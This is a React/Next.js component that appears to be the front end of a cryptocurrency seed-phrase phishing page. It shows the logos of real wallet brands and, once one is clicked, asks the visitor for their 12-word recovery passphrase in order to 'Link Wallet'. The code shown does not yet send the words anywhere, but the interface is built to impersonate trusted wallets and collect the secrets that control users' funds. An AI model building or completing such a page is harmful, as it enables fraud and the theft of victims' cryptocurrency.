'use client'

import Image from "next/image";
import '../../app/globals.css'
import { useState } from "react";

const cryptoServices = [
    { name: "Trust Wallet", logo: 'https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png' },
    { name: "Lobstr", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxZO-w6G9AhJ0wp-OJ0-JSCnTg-VkTBLvRTw&s' },
    { name: "Exodus", logo: 'https://www.bestcrypto-wallet.com/wp-content/uploads/2025/04/exodus-logo.jpg' },
    { name: "Atomic", logo: 'https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png' },
    { name: "Meta Mask", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ymr3UNKopfI0NmUY95Dr-0589vG-91KuAA&s' },
    { name: "Crypto.com | Defi wallet", logo: 'https://play-lh.googleusercontent.com/BoiXD2RIG2Bk-xsz4jhlmTznlAPgOAsJhtbi4mbApNX1oGJiSPlhmRkM7T-i9CaBX_E' },
    { name: "Pillar", logo: 'https://play-lh.googleusercontent.com/9nnmrnE-K2Aez5gY_vco8wfQaYxBPjOdUoInE7LlG-gyNsfN6zYOa0UKEj9UvxcLiBp4=w240-h480-rw' },
    { name: "BiyPay", logo: 'https://pbs.twimg.com/profile_images/750715284298862596/hgLKxRsO_400x400.jpg' },
];

export default function BackupWallet() {
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [isModalOpen, setIsModalOpen] = useState(false);

    const openModal = (wallet: any) => {
        setSelectedWallet(wallet);
        setIsModalOpen(true);
    };

    const closeModal = () => {
        setIsModalOpen(false);
        setSelectedWallet(null);
    };

    return (
        <div className="bg-[#11150f] text-white px-6 pt-8">
            <h2 className="text-lg font-semibold mb-8">Backup Wallet</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-[20px]">
                {cryptoServices.map((service, i) => (
                    <div
                        key={i}
                        onClick={() => openModal(service)}
                        className="flex items-center gap-4 bg-black/20 rounded-lg px-3 py-3 transition border border-[#f1f1f2]"
                    >
                        <div className="w-12 h-12 relative rounded-lg overflow-hidden mr-[12px]">
                            <Image
                                src={service.logo}
                                alt={service.name}
                                fill
                                className="object-cover"
                            />
                        </div>
                        <div>
                            <h3 className="text-lg">{service.name}</h3>
                        </div>
                    </div>
                ))}
            </div>
            {isModalOpen && selectedWallet && (
                <div className="fixed inset-0 z-50 bg-black bg-opacity-70 flex justify-center items-center">
                    <div className="bg-[#1a1a1a] rounded-lg w-[90%] max-w-md p-8 relative text-white">
                        <button onClick={closeModal} className="absolute top-4 right-6 text-xl border-none w-0">×</button>
                        <div className="flex items-center gap-[12px] mb-4">
                            <div className="w-10 h-10 relative rounded-lg overflow-hidden">
                                <Image
                                    src={selectedWallet.logo}
                                    alt={selectedWallet.name}
                                    fill
                                    className="object-cover"
                                />
                            </div>
                            <h2 className="text-xl font-bold">{selectedWallet.name}</h2>
                        </div>
                        <br />
                        <hr />
                        <br />
                        <p className="mb-[20px] text-center text-[16px]">Enter your 12-word passphrase:</p>
                        <div className="grid grid-cols-2 gap-[10px] mb-[16px] !text-[13px]">
                            {Array.from({ length: 12 }).map((_, i) => (
                                <input
                                    key={i}
                                    type="text"
                                    placeholder={`Word ${i + 1}`}
                                    className="!bg-[#333] p-2 rounded text-white border !border-gray-600 outline-none !text-[13px] placeholder:!text-[13px]"
                                />
                            ))}
                        </div>
                        <button className="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded w-full text-[16px]">Link Wallet</button>
                    </div>
                </div>
            )}
        </div>
    );
}